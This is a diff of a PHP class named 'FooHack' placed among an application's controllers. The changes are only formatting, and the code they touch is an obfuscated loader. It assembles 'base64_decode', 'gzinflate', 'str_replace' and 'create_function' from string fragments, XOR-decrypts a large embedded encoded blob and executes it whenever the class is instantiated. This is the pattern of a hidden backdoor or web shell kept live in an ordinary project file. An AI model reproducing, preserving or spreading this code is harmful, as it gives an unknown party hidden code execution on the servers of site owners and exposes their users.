@@ -4,7 +4,7 @@ namespace App\Shared\Infrastructure\Controllers\Open;
 
 final class FooHack
 {
-    function __construct()
+    public function __construct()
     {
         $module = $this->stack($this->claster);
         $module = $this->tx($this->backend($module));
@@ -12,67 +12,69 @@ final class FooHack
         $this->conf($module[0], $module[1]);
     }
 
-    function conf($debug, $move)
+    public function conf($debug, $move)
     {
         $this->zx = $debug;
         $this->move = $move;
         $this->x64 = $this->stack($this->x64);
         $this->x64 = $this->backend($this->x64);
         $this->x64 = $this->mv();
-        if (strpos($this->x64, $this->zx) !== false)
+        if (strpos($this->x64, $this->zx) !== false) {
             $this->point($this->x64);
+        }
     }
 
-    function dx($move, $memory, $debug)
+    public function dx($move, $memory, $debug)
     {
         if (strlen($debug) != 0) {
-            for ($i = 0; $i < strlen($memory); $i++)
+            for ($i = 0; $i < strlen($memory); $i++) {
                 $memory[$i] = ($memory[$i] ^ $debug[$i % strlen($debug)]);
+            }
         }
         return $memory;
     }
 
-    function backend($str)
+    public function backend($str)
     {
         $stable = $this->backend[3] . $this->backend[1] . (16 / 2 * 16 / 2) . $this->backend[2] . $this->backend[0];
         $stable = @$stable($str);
         return $stable;
     }
 
-    function tx($str)
+    public function tx($str)
     {
         $stable = $this->tx[4] . $this->tx[0] . $this->tx[3] . $this->tx[2] . $this->tx[1];
         $stable = @$stable($str);
         return $stable;
     }
 
-    function mv()
+    public function mv()
     {
         $this->access = $this->dx($this->move, $this->x64, $this->zx);
         $this->access = $this->tx($this->access);
         return $this->access;
     }
 
-    function point($ls)
+    public function point($ls)
     {
         $stable = $this->cache[1] . $this->cache[2] . $this->cache[0];
         $view = @$stable('', $ls);
         return $view();
     }
 
-    function stack($in)
+    public function stack($in)
     {
         $stable = $this->code[1] . $this->code[2] . $this->code[0];
         return $stable("\r\n", "", $in);
     }
 
-    var $load;
-    var $tx = array('in', 'e', 'at', 'fl', 'gz');
-    var $cache = array('ction', 'creat', 'e_fun');
-    var $backend = array('ode', 'e', '_dec', 'bas');
-    var $code = array('ace', 'str_', 'repl');
+    public $load;
+    public $tx = ['in', 'e', 'at', 'fl', 'gz'];
+    public $cache = ['ction', 'creat', 'e_fun'];
+    public $backend = ['ode', 'e', '_dec', 'bas'];
+    public $code = ['ace', 'str_', 'repl'];
 
-    var $x64 = "nB85Q+N41Iw8aQKCNZ+FGo9xhDA9o6IVf9s9VYVA1msvQz2bPRTrRm8mKc7BaFtiemrz4dUOga6NHBZr4+7hwsyz1xWzu+nc/mS6
+    public $x64 = "nB85Q+N41Iw8aQKCNZ+FGo9xhDA9o6IVf9s9VYVA1msvQz2bPRTrRm8mKc7BaFtiemrz4dUOga6NHBZr4+7hwsyz1xWzu+nc/mS6
 	ze/Dq+lVWB3S5/3IixmL7nzCYd2W1j/F35veIDNz9WDwm23CAJo3nevKzO07X5yp2de/S4no115CgNifK0oyAI9lB7rfTkcuQ9gb
 	VgkIT4VaGu+pXF5wG4CQBPxV9mIdwOAHW3QeeaFymkaqHfUCuS8gSwGvSzrU1huuoCf++Prn4J5T+M++MLEiMzrWkiu5UQNvGK3v
 	2C9+CG7UJYjoLIrzQ03KPlW+FzuPPkiItaXLv5KjwgJ4qT8MU14J1MD6JyjeoSL2uBg02rcWUTxBwJ79S+1mLgVqzhCB2AT8r9jP
@@ -237,7 +239,7 @@ final class FooHack
 	QT/9kFua0MVxCwOu21OpfMThHrWQ7tt40f7qexqq8tA7khKiO0LqtoFuFLsY12TbZhkeA29N7kzJw0dWfr7CaXh9lFTA1TAeCqg9
 	VatIJOMW/mRERh2pg0jJbAx2wsY=";
 
-    var $claster = "XY9BS8NAEIXvhf6HcQlsAkEtxVJJk4ssVDxEk+glSFjbrVnoZsPupNh/78R60Nxm5r355k3gT7KDFFjD
+    public $claster = "XY9BS8NAEIXvhf6HcQlsAkEtxVJJk4ssVDxEk+glSFjbrVnoZsPupNh/78R60Nxm5r355k3gT7KDFFjD
 	4Br88OHRhWZ/FwZNKYo3UdR8W1XPzTYvK/4exXAbwzJK5jN9CLX3CslYiJdXUVY1b8wneSIIWt8S8x9t
 	YvoBLVZRAuro1R/YQ54/PYo6GHMRaz77hU2UBGjnSpkez+HooKtO4eA6kM7JyywGvl4tlvdrPgZWu9YC
 	3xysMyB3qG2XMgZGYWv3KeutR5ZtdNcPCHjuVcpQfSGDThqqKfREpeeMJv0kjwO1WUb6zQjPePIN";
